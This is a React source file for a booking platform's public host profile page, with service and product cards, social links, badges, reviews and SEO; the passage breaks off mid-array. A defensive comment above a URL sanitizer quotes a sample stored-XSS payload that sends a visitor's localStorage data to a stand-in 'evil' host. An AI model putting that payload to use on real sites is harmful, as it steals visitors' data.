import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate, Navigate, Link } from "react-router-dom";
import { isVanitySlug, VANITY_TARGET } from "../config/vanityRedirects";
import { getHostProfile, getHostReviews, getHostProducts, getVendorBadges } from "../services/api";
import { DEMO_PERSONAS, DEMO_USERNAME, personaView } from "../data/demoPersonas";
import { analytics, EVENTS } from "../services/analytics";
import BrandPreloader from "../components/preloader/BrandPreloader";
import { useHideChrome } from "../context/ChromeContext";
import Footer from "../components/common/Footer";
import Seo from "../components/common/Seo";
import ErrorPage from "./ErrorPage";
import TransientError from "../components/error/TransientError";
import { isNotFoundError } from "../utils/fetchError";
import { resolveProfileSeo, profileGraphJsonLd, SITE_URL } from "../utils/seo";
import { profileFaqs } from "../utils/profileFaqs";
import FaqAccordion from "../components/FaqAccordion";
import { prerendered } from "../services/prerenderData";
import { BadgeCheck, LayoutGrid, Calendar } from "lucide-react";

// Production base for canonical/OG (Vercel env overrides the apex default).
const SEO_SITE = import.meta.env?.VITE_PUBLIC_SITE_URL || SITE_URL;
import {
  DEFAULT_THEME_COLOR,
  isValidHex,
  applyProfileTheme,
} from "../utils/themeUtils";

// ─── Design tokens — Meeticulous "Loop & Slot" (light) ──────────────────────────
// Repointed from the old monochrome set to brand tokens, so the cards / reviews /
// FAQ that read `C` are rebranded in one place. The host's chosen colour still
// themes buttons + CTAs via --profile-accent (tc); these are the neutral chrome.
const C = {
  bg:        '#FBF5F3', // cream
  card:      '#FFFFFF',
  text:      '#2B0A14', // ink
  secondary: '#6B524F',
  muted:     '#8C716D',
  border:    '#EBDCD9', // line
  btnBg:     '#960D32', // maroon
  btnText:   '#FFFFFF',
};

// Sanitize a vendor-supplied social link before using it as an href.
// social_links are vendor-controlled and rendered on a public page — a value
// like `javascript:fetch('//evil/?c='+localStorage.user)` would be stored XSS
// against any visitor who clicks it. Allow only http(s) links (and mailto: for
// a valid email); anything else collapses to a harmless '#'.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const safeUrl = (value, isEmail = false) => {
  const v = String(value || '').trim();
  if (isEmail) return EMAIL_RE.test(v) ? `mailto:${v}` : '#';
  return /^https?:\/\//i.test(v) ? v : '#';
};

// ─── Star Rating ─────────────────────────────────────────────────────────────
const Stars = ({ avg, count, size = "sm" }) => {
  const sz = size === "lg" ? "w-4 h-4" : "w-3 h-3";
  return (
    <div className="flex items-center gap-0.5">
      {[1, 2, 3, 4, 5].map((s) => (
        <svg key={s} className={`${sz} flex-shrink-0`}
          style={{ color: s <= Math.round(avg) ? '#F6C35A' : C.border }}
          fill="currentColor" viewBox="0 0 20 20">
          <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
        </svg>
      ))}
      {avg > 0 && (
        <span className="text-xs ml-1" style={{ color: C.secondary }}>
          {avg.toFixed(1)}{count > 0 ? ` (${count})` : ''}
        </span>
      )}
    </div>
  );
};

// ─── Social Icon SVGs — outline (linear) set, monochrome ──────────────────────
const SOCIAL_ICONS = {
  instagram: <>
    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
  </>,
  youtube: <>
    <path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" />
    <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" />
  </>,
  linkedin: <>
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
    <rect x="2" y="9" width="4" height="12" />
    <circle cx="4" cy="4" r="2" />
  </>,
  facebook: <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />,
  twitter:  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />,
  whatsapp: <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />,
  website: <>
    <circle cx="12" cy="12" r="10" />
    <line x1="2" y1="12" x2="22" y2="12" />
    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
  </>,
  github: <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />,
  email: <>
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
    <polyline points="22,6 12,13 2,6" />
  </>,
};

// Social circle, brand-neutral outline on the host-accent tint.
const SocialIcon = ({ platform, href }) => {
  const icon = SOCIAL_ICONS[platform];
  if (!icon || !href) return null;
  return (
    <a href={href} target="_blank" rel="noreferrer"
      className="flex items-center justify-center flex-shrink-0 transition-colors hover:opacity-80"
      style={{ width: 34, height: 34, borderRadius: '50%', border: `1px solid ${C.border}`, color: C.secondary, background: C.card }}
      title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
      <svg className="w-4 h-4" fill="none" stroke="currentColor"
        strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round"
        viewBox="0 0 24 24">
        {icon}
      </svg>
    </a>
  );
};

// ─── Badge (image award) ──────────────────────────────────────────────────────
const Badge = ({ badge, onSelect }) => {
  const label = badge.label || badge.name || 'Badge';
  return (
    <button
      type="button"
      onClick={() => onSelect?.(badge)}
      aria-label={label}
      className="flex items-center justify-center cursor-pointer select-none overflow-hidden transition-transform hover:scale-110"
      style={{
        width: 44, height: 44, borderRadius: 12, background: '#F5ECEA', fontSize: 22,
        border: `1px solid ${C.border}`,
      }}>
      {badge.image_url
        ? <img src={badge.image_url} alt={label} className="w-full h-full object-contain" />
        : <span className="font-extrabold" style={{ color: C.text }}>{label.charAt(0)?.toUpperCase()}</span>}
    </button>
  );
};

// ─── Service tag derivation ───────────────────────────────────────────────────
const getServiceTag = (service) => {
  if (!service.created_at) return null;
  const days = (Date.now() - new Date(service.created_at).getTime()) / 86400000;
  if (days <= 30) return 'New';
  return null;
};

// Compact price label. "Price on request" hides the fee (host quotes offline).
const cardPriceLabel = (s) => (s.price_on_request ? 'On request' : s.price === 0 ? 'Free' : `₹${s.price}`);

// ─── Service Card ──────────────────────────────────────────────────────────────
const ServiceCard = ({ service: s, profileSlug }) => {
  const _rawDesc  = s.short_description || s.description || '';
  const desc      = _rawDesc.length > 95 ? `${_rawDesc.slice(0, 94)}…` : _rawDesc;
  const detailUrl = s.slug ? `/${profileSlug}/${s.slug}` : null;
  const bookUrl   = s.slug ? `/${profileSlug}/booking/${s.slug}` : null;
  const tag       = getServiceTag(s);

  return (
    <article className="flex flex-col bg-white rounded-2xl transition-all hover:-translate-y-0.5 hover:shadow-[0_12px_30px_rgba(43,10,20,0.08)]"
      style={{ border: `2px solid ${C.border}`, padding: '18px 18px 16px' }}>

      {/* Type pill + tag */}
      <div className="flex items-center justify-between gap-2 mb-2.5">
        <span className="inline-flex items-center gap-1.5 text-[11.5px] font-semibold px-2.5 py-1 rounded-full"
          style={{ background: 'var(--profile-accent-light, #FFE4EA)', color: 'var(--profile-accent, #960D32)' }}>
          <svg className="w-3 h-3" fill="none" stroke="currentColor" strokeWidth={2.2} viewBox="0 0 24 24">
            <rect x="3" y="4" width="18" height="18" rx="2" /><path d="M16 2v4M8 2v4M3 10h18" />
          </svg>
          1:1 Session
        </span>
        {tag && (
          <span className="flex-shrink-0 text-[10px] font-semibold px-2 py-0.5 rounded-full"
            style={{ background: '#FDF0D2', color: '#5A3A00' }}>
            {tag}
          </span>
        )}
      </div>

      {detailUrl
        ? <Link to={detailUrl} className="font-display font-bold text-base leading-snug hover:opacity-60 transition-opacity line-clamp-2" style={{ color: C.text }}>{s.title}</Link>
        : <span className="font-display font-bold text-base leading-snug line-clamp-2" style={{ color: C.text }}>{s.title}</span>}

      {desc && <p className="text-sm leading-relaxed line-clamp-2 mt-2" style={{ color: C.secondary }}>{desc}</p>}

      {/* Meta — duration + mode */}
      <div className="flex items-center gap-4 text-xs mt-3 mb-4" style={{ color: C.secondary }}>
        <span className="flex items-center gap-1.5">
          <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="9" /><path strokeLinecap="round" strokeLinejoin="round" d="M12 7v5l3 2" />
          </svg>
          {s.duration} min
        </span>
        <span className="flex items-center gap-1.5">
          {s.meeting_mode === 'offline' ? (
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
              <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" /><circle cx="12" cy="10" r="3" />
            </svg>
          ) : (
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
              <polygon points="23 7 16 12 23 17 23 7" /><rect x="1" y="5" width="15" height="14" rx="2" ry="2" />
            </svg>
          )}
          {s.meeting_mode === 'offline' ? 'In-person' : 'Online'}
        </span>
        {s.booking_count > 0 && (
          <span className="flex items-center gap-1.5">
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
              <rect x="3" y="4" width="18" height="18" rx="2" /><path d="M16 2v4M8 2v4M3 10h18m-9 5 2 2 4-4" />
            </svg>
            {`Booked ${s.booking_count}×`}
          </span>
        )}
      </div>

      {/* Footer — price + Book */}
      <div className="flex items-center justify-between mt-auto pt-4" style={{ borderTop: `1px solid ${C.border}` }}>
        <div className="font-display font-extrabold text-lg leading-none" style={{ color: C.text }}>{cardPriceLabel(s)}</div>
        {bookUrl && (
          <Link to={bookUrl}
            className="text-sm font-semibold flex items-center rounded-full transition-opacity hover:opacity-85"
            style={{ background: 'var(--profile-accent, #960D32)', color: 'var(--profile-accent-text, #ffffff)', height: 40, padding: '0 18px' }}>
            Book Now
          </Link>
        )}
      </div>
    </article>
  );
};

// ─── Digital Product Card ─────────────────────────────────────────────────────
const TYPE_ICONS = { pdf: '📄', template: '🗂️', ebook: '📚', prompt_pack: '✨', resource: '🔗', other: '📦' };

const ProductCard = ({ product: p, profileSlug }) => {
  const isFree    = Number(p.price) === 0;
  const typeLabel = String(p.type || 'other').replace(/_/g, ' ');
  const buys      = p.purchase_count || 0;
  const proof     = buys > 0 ? `${buys} ${isFree ? 'downloaded' : 'bought'}` : null;
  const detailUrl = `/${profileSlug}/product/${p.slug || p.id}`;

  return (
    <div className="flex flex-row sm:flex-col bg-white rounded-2xl overflow-hidden transition-all hover:-translate-y-0.5 hover:shadow-[0_12px_30px_rgba(43,10,20,0.08)]"
      style={{ border: `2px solid ${C.border}` }}>

      <Link to={detailUrl}
        className="relative flex-shrink-0 w-28 self-stretch sm:w-full sm:self-auto aspect-[16/9] overflow-hidden"
        style={{ background: 'linear-gradient(135deg, var(--profile-accent-light, #FFE4EA), var(--profile-accent, #960D32))' }}>
        {p.thumbnail_url
          ? <img src={p.thumbnail_url} alt={p.title} loading="lazy" decoding="async" className="w-full h-full object-cover" />
          : <span className="absolute inset-0 flex items-center justify-center text-4xl opacity-50">{TYPE_ICONS[p.type] || '📦'}</span>}
        <span className="absolute top-2 left-2 text-[10px] font-semibold px-2 py-0.5 rounded-full capitalize"
          style={{ background: 'rgba(255,255,255,0.92)', color: 'var(--profile-accent, #960D32)' }}>
          {typeLabel}
        </span>
      </Link>

      <div className="flex flex-col gap-1.5 p-4 flex-1 min-w-0">
        <Link to={detailUrl}
          className="font-display font-bold leading-snug line-clamp-2 hover:opacity-60 transition-opacity"
          style={{ color: C.text, fontSize: 15 }}>
          {p.title}
        </Link>
        {proof && <div className="text-xs" style={{ color: C.muted }}>{proof}</div>}
        {p.description && (
          <p className="hidden sm:block text-sm leading-relaxed line-clamp-2" style={{ color: C.secondary }}>{p.description}</p>
        )}
        <div className="flex items-center justify-between mt-auto pt-3" style={{ borderTop: `1px solid ${C.border}` }}>
          <div className="font-display font-extrabold leading-none" style={{ color: C.text, fontSize: 17 }}>{isFree ? 'Free' : `₹${p.price}`}</div>
          <Link to={detailUrl}
            className="text-sm font-semibold flex items-center rounded-full transition-opacity hover:opacity-85"
            style={{ background: 'var(--profile-accent, #960D32)', color: 'var(--profile-accent-text, #ffffff)', height: 36, padding: '0 16px' }}>
            {isFree ? 'Get Free' : 'Buy Now'}
          </Link>
        </div>
      </div>
    </div>
  );
};

// Prerender-baked /host/:slug payload, or null when it can't be shown as-is.
function bakedProfile(slug) {
  const d = prerendered(`/host/${slug}`);
  if (!d?.host || d.redirect || d.host.username === DEMO_USERNAME) return null;
  return { host: d.host, services: d.services || [] };
}

// ─── Main ─────────────────────────────────────────────────────────────────────
const HostProfile = () => {
  const { profileSlug } = useParams();
  const navigate = useNavigate();
  // This page owns a host-branded navbar + its own footer, so drop the global
  // marketing chrome. useHideChrome flips the flag in a useLayoutEffect (before
  // paint) and the puppeteer prerender runs it too, so the host navbar is baked
  // into the crawler HTML — no flash, no CLS, no hydration mismatch.
  useHideChrome();
  // Vanity easter-egg slugs (/69, /founder, …) redirect to one public profile.
  const isVanity = isVanitySlug(profileSlug);
  const pageRef         = useRef(null);
  // Build-time copy baked into the prerendered HTML → real profile on the first
  // frame; the fetch effect below refreshes it.
  const seed = isVanity ? null : bakedProfile(profileSlug);
  const [host,        setHost]        = useState(seed?.host ?? null);
  const [services,    setServices]    = useState(seed?.services ?? []);
  const [loading,     setLoading]     = useState(!seed);
  const [error,       setError]       = useState('');
  // Demo persona switch (public /demo account only).
  const [isDemo,      setIsDemo]      = useState(false);
  const [personaKey,  setPersonaKey]  = useState(null);
  const demoBase = useRef(null);
  const [filter,      setFilter]      = useState('all'); // all | service | product
  const [reviewData,  setReviewData]  = useState(() => (seed && prerendered(`/reviews/${profileSlug}`)) || { reviews: [], count: 0, avg: 0 });
  const [showReviews, setShowReviews] = useState(false);
  const [products,    setProducts]    = useState(() => (seed && prerendered(`/products/host/${profileSlug}`)) || []);
  const [badgeList,   setBadgeList]   = useState(() => (seed && prerendered(`/vendors/${profileSlug}/badges`)?.badges) || []);
  const [badgeInfo,   setBadgeInfo]   = useState(null); // clicked badge → bottom-right info popup
  const [cardExpanded, setCardExpanded] = useState(false); // "More about" details expander

  useEffect(() => {
    if (isVanity) return; // vanity slug → redirected in render; skip the 404 lookup
    let alive = true;
    setError('');
    const baked = bakedProfile(profileSlug);
    if (baked) { setHost(baked.host); setServices(baked.services); setLoading(false); } else setLoading(true);
    // Only a real 404 means the host is gone → the noindex ErrorPage is correct.
    // Any OTHER failure (network/timeout, 5xx, 429/403) is transient: retry with
    // backoff, then fall to the non-noindex 'transient' state so a JS-rendering
    // crawler that hit a blip doesn't noindex this live, prerendered page.
    const load = async (attempt = 0) => {
      try {
        const { data } = await getHostProfile(profileSlug);
        if (!alive) return;
        if (data.redirect && data.username) {
          navigate(`/${data.username}`, { replace: true });
          return;
        }
        if (data.host?.username === DEMO_USERNAME) {
          const base = { host: data.host, services: data.services || [] };
          demoBase.current = base;
          setIsDemo(true);
          const firstKey = DEMO_PERSONAS[0].key;
          const view = personaView(base, firstKey);
          setPersonaKey(firstKey);
          setHost(view.host);
          setServices(view.services);
        } else {
          setHost(data.host);
          setServices(data.services || []);
        }
        analytics.track(EVENTS.PROFILE_VIEWED, { host_id: data.host?.id, slug: profileSlug });
        getHostReviews(profileSlug).then(r => setReviewData(r.data)).catch(() => {});
        getHostProducts(profileSlug).then(r => setProducts(r.data || [])).catch(() => {});
        getVendorBadges(profileSlug).then(r => setBadgeList(r.data?.badges || [])).catch(() => {});
        setLoading(false);
      } catch (err) {
        if (!alive) return;
        if (isNotFoundError(err)) { setError('notfound'); setLoading(false); return; }
        if (attempt < 2) { setTimeout(() => { if (alive) load(attempt + 1); }, 800 * (attempt + 1)); return; }
        if (!baked) setError('transient'); // baked copy stays on a transient failure
        setLoading(false);
      }
    };
    load();
    return () => { alive = false; };
  }, [profileSlug, isVanity]);

  // Inject --profile-accent and --profile-accent-text CSS variables so themed
  // elements pick up the host's chosen colour.
  useEffect(() => {
    if (!host || !pageRef.current) return;
    const color = isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
    applyProfileTheme(pageRef.current, color);
    // Stash the colour so the booking page's loading spinner can paint in it from
    // the first frame (before its own fetch resolves). See ServiceBooking.
    try { sessionStorage.setItem(`bas_theme:${profileSlug}`, color); } catch { /* private mode */ }
  }, [host]);

  // Apply a demo persona: override the header fields + show only that persona's
  // services. key=null restores the base account.
  const applyPersona = (key) => {
    const base = demoBase.current;
    if (!base) return;
    const view = personaView(base, key);
    setPersonaKey(key);
    setHost(view.host);
    setServices(view.services);
  };

  // Badge info popup auto-dismisses after 5s.
  useEffect(() => {
    if (!badgeInfo) return;
    const t = setTimeout(() => setBadgeInfo(null), 5000);
    return () => clearTimeout(t);
  }, [badgeInfo]);

  // Derived values are null-safe: the component renders the preloader while host
  // is still loading, so these run before host exists.
  const tc        = host && isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
  const social    = host?.social_links || {};
  const badges    = badgeList;
  const firstName = (host?.name || '').trim().split(/\s+/)[0] || 'the host';

  const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];
  const socialLinks  = SOCIAL_ORDER
    .filter(k => social[k])
    .map(k => ({ key: k, href: safeUrl(social[k], k === 'email') }))
    .filter(({ href }) => href !== '#');

  const hasProducts = products.length > 0;
  // Offering types the host actually has drive the icon filters + nav (Memberships
  // and Updates are omitted until there's a data source — no empty doorway tabs).
  const showServices = filter === 'all' || filter === 'service';
  const showProducts = (filter === 'all' || filter === 'product') && hasProducts;
  // Featured hero only on the "all" view, and only when there's a service to lead
  // with; the grid then skips that first service so it isn't shown twice.
  const featured     = filter === 'all' && services.length ? services[0] : null;
  const gridServices = showServices ? (featured ? services.slice(1) : services) : [];
  const nothingShown = gridServices.length === 0 && !featured && !showProducts;

  // Intro / discovery CTA — the host's first FREE active service (price 0, not
  // on-request) is their low-friction entry offer. No schema: "free" is already a
  // first-class service state (plan free_services cap). Null when the host has none.
  const introService = services.find(
    (s) => s.slug && !s.price_on_request && Number(s.price) === 0,
  );

  // Admin-managed SEO → head tags + ProfilePage JSON-LD (only once host loaded).
  const seo = host ? resolveProfileSeo({ host, services, siteUrl: SEO_SITE }) : null;
  // Template FAQs are emitted as FAQPage ONLY when the host has host-specific facts
  // (services or a profession) — otherwise they're generic and thin (guide §5.3).
  // MIRROR this gate in server prerenderController resolveProfileMeta.
  const faqs = host ? profileFaqs({ host, services }) : [];
  const faqsHostSpecific = host && (services.length > 0 || !!host.profession);
  const jsonLd = host ? [profileGraphJsonLd({
    host, siteUrl: SEO_SITE, services, name: seo?.title,
    rating: { avg: reviewData.avg, count: reviewData.count },
    faqs: faqsHostSpecific ? faqs : [],
  })] : null;

  if (isVanity) return <Navigate to={`/${VANITY_TARGET}`} replace />;

  // A dead slug otherwise renders thin "Host not found" HTML at 200 (a Google "soft
  // 404"). ErrorPage carries noindex/nofollow, so a gone host drops out cleanly; a
  // transient failure uses TransientError (no noindex) so a live page isn't dropped.
  if (error === 'notfound') return <ErrorPage code={404} />;
  if (error === 'transient') return <TransientError message="This profile didn’t load. Please try again." />;

  const goOfferings = (f) => {
    setFilter(f);
    document.getElementById('offerings')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  };

  return (
    <>
      {seo && <Seo {...seo} jsonLd={jsonLd} />}
      <BrandPreloader
        variant="profile"
        ready={!loading && !!host && !error}
        profileName={host?.name}
        accentColor={tc}
      />

      {!host ? (
        // Placeholder, NOT null: these routes are prerendered, so hydration runs
        // with host===null for one API round-trip. Holding viewport height keeps
        // everything below still (avoids CLS).
        <div className="min-h-screen" style={{ background: C.bg }} />
      ) : (
    <div ref={pageRef} className="host-profile min-h-screen flex flex-col" style={{ background: C.bg }}>

      {/* ── Host-branded navbar — host identity replaces the logo; nav links drive
          the offering filters; CTA converts visitors into hosts ── */}
      <nav className="sticky top-0 z-40" style={{ background: 'rgba(255,255,255,0.88)', backdropFilter: 'blur(10px)', borderBottom: `1px solid ${C.border}` }}>
        <div className="app-container flex items-center gap-4" style={{ height: 66 }}>
          <a href="#top" className="flex items-center gap-2.5 min-w-0 flex-shrink-0">
            <span className="flex-shrink-0 overflow-hidden flex items-center justify-center"
              style={{ width: 38, height: 38, borderRadius: '50%', background: `${tc}18`, color: tc }}>
              {host.profile_image
                ? <img src={host.profile_image} alt={host.name} width={38} height={38} decoding="async" className="w-full h-full object-cover" />
                : <span className="font-display font-extrabold text-sm">{host.name?.charAt(0)?.toUpperCase()}</span>}
            </span>
            <span className="font-display font-bold text-[15px] truncate" style={{ color: C.text }}>{host.name}</span>
            {host.is_verified && (
              <BadgeCheck className="w-4 h-4 flex-shrink-0" strokeWidth={2.2} style={{ color: tc }} aria-label="Verified" />
            )}
          </a>

          <div className="hidden md:flex items-center gap-1 ml-2">
            {hasProducts && (
              <button onClick={() => goOfferings('product')} className="text-sm font-medium px-3 py-2 rounded-full transition-colors hover:bg-[#F5ECEA]" style={{ color: C.secondary }}>Products</button>
            )}
            {/* Membership + Feed — placeholders, inactive until those surfaces ship. */}
            <button type="button" disabled title="Membership — coming soon" aria-label="Membership (coming soon)"
              className="p-2 rounded-full opacity-40 cursor-not-allowed" style={{ color: C.secondary }}>
              <LayoutGrid className="w-[18px] h-[18px]" strokeWidth={1.8} />
            </button>
            <button type="button" disabled title="Feed — coming soon" aria-label="Feed (coming soon)"
              className="p-2 rounded-full opacity-40 cursor-not-allowed" style={{ color: C.secondary }}>
              <Calendar className="w-[18px] h-[18px]" strokeWidth={1.8} />
            </button>
          </div>

          <Link to="/become-a-host"
            className="ml-auto flex-shrink-0 inline-flex items-center gap-1.5 rounded-full font-semibold text-[13.5px] transition-opacity hover:opacity-90"
            style={{ height: 42, padding: '0 18px', background: tc, color: '#fff' }}>
            <span className="hidden sm:inline">Start Your Page — Free</span>
            <span className="sm:hidden">Start — Free</span>
          </Link>
        </div>
      </nav>

      {host.is_verified === false && (
        <div className="px-4 py-2 text-center text-sm"
          style={{ background: '#FDF0D2', color: '#5A3A00' }}>
          ⚠️ This creator's account is pending admin verification.
        </div>
      )}

      <div id="top" className="app-container pt-6 pb-16 flex-1">

        {isDemo && (
          <div className="mb-5 flex flex-wrap items-center gap-2 rounded-2xl p-2"
            style={{ background: C.card, border: `2px solid ${tc}33` }}>
            <span className="px-2 text-xs font-bold uppercase tracking-wide" style={{ color: C.secondary }}>
              Demo · view as
            </span>
            {[{ key: null, label: 'Default' }, ...DEMO_PERSONAS].map((p) => {
              const active = personaKey === p.key;
              return (
                <button key={p.key || 'base'} onClick={() => applyPersona(p.key)}
                  className="px-3 py-1.5 rounded-full text-sm font-semibold transition-colors"
                  style={active
                    ? { background: tc, color: '#fff' }
                    : { background: `${tc}12`, color: C.text }}>
                  {p.label}
                </button>
              );
            })}
          </div>
        )}

        <div className="flex flex-col lg:flex-row gap-7 items-start">

          {/* ── LEFT — compact identity card (no cover) ──────────────── */}
          <aside className="w-full max-w-md mx-auto lg:mx-0 lg:max-w-none lg:w-[320px] lg:flex-shrink-0 lg:sticky lg:top-[90px]">
            <div className="rounded-3xl overflow-hidden" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 8px 28px rgba(43,10,20,0.05)' }}>
              <div className="px-6 pt-6 pb-5 text-center">

                {/* Avatar */}
                <div className="flex justify-center relative">
                  <div className="relative overflow-hidden flex items-center justify-center"
                    style={{ width: 92, height: 92, borderRadius: '50%', background: `${tc}18`, border: `1px solid ${C.border}` }}>
                    {host.profile_image
                      ? <img src={host.profile_image} alt={host.name} width={92} height={92} fetchpriority="high" decoding="async" className="w-full h-full object-cover" />
                      : <span className="font-display font-extrabold text-3xl" style={{ color: tc }}>{host.name?.charAt(0)?.toUpperCase()}</span>}
                    {host.is_verified && (
                      <span className="absolute flex items-center justify-center" style={{ bottom: 2, right: 'calc(50% - 46px)', width: 22, height: 22, borderRadius: '50%', background: tc, border: `3px solid ${C.card}` }}>
                        <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth={3.5} strokeLinecap="round" strokeLinejoin="round"><path d="M20 6 9 17l-5-5" /></svg>
                      </span>
                    )}
                  </div>
                </div>

                {/* Name + profession */}
                <h1 className="font-display font-extrabold text-xl mt-3.5" style={{ color: C.text }}>{host.name}</h1>
                {(host.profession || host.tagline) && (
                  <p className="font-semibold text-sm mt-1.5" style={{ color: tc }}>{host.profession || host.tagline}</p>
                )}

                {/* Rating row — real, only when reviews exist */}
                {reviewData.count > 0 && (
                  <div className="flex items-center justify-center gap-2.5 mt-2.5 text-sm" style={{ color: C.secondary }}>
                    <span className="font-semibold flex items-center gap-1" style={{ color: C.text }}>
                      <svg className="w-3.5 h-3.5" style={{ color: '#F6C35A' }} fill="currentColor" viewBox="0 0 20 20">
                        <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                      </svg>
                      {reviewData.avg.toFixed(1)}
                    </span>
                    <span style={{ width: 3, height: 3, borderRadius: '50%', background: C.muted, display: 'inline-block' }} />
                    <span>{reviewData.count} review{reviewData.count !== 1 ? 's' : ''}</span>
                  </div>
                )}

                {/* Social proof — real completed/confirmed bookings (cancelled excluded) */}
                {host.booking_count > 0 && (
                  <div className="flex items-center justify-center gap-1.5 mt-2 text-xs" style={{ color: C.secondary }}>
                    <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: tc }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                      <rect x="3" y="4" width="18" height="18" rx="2" /><path d="M16 2v4M8 2v4M3 10h18m-9 5 2 2 4-4" />
                    </svg>
                    <span>Booked <strong style={{ color: C.text }}>{host.booking_count}</strong> time{host.booking_count !== 1 ? 's' : ''}</span>
                  </div>
                )}

                {/* More about — expander for bio / trust / socials / badges / location */}
                <button onClick={() => setCardExpanded(v => !v)} aria-expanded={cardExpanded} aria-controls="host-more"
                  className="w-full mt-4 flex items-center justify-center gap-1.5 rounded-full font-semibold text-[13px] transition-colors"
                  style={{ height: 40, border: `1px solid ${C.border}`, background: C.card, color: C.secondary }}>
                  {cardExpanded ? 'Show less' : `More about ${firstName}`}
                  <svg className={`w-3.5 h-3.5 transition-transform ${cardExpanded ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" strokeWidth={2.2} viewBox="0 0 24 24"><path d="M6 9l6 6 6-6" /></svg>
                </button>
              </div>

              <div id="host-more" className="overflow-hidden transition-[max-height] duration-300 ease-out" style={{ maxHeight: cardExpanded ? 680 : 0 }}>
                <div className="px-6 pb-6 text-center">
                  {host.bio && <p className="text-sm leading-relaxed" style={{ color: C.secondary }}>{host.bio}</p>}

                  {/* Trust — real platform guarantees */}
                  <div className="flex flex-col gap-2.5 mt-4 pt-4 text-left" style={{ borderTop: `1px solid ${C.border}` }}>
                    {[
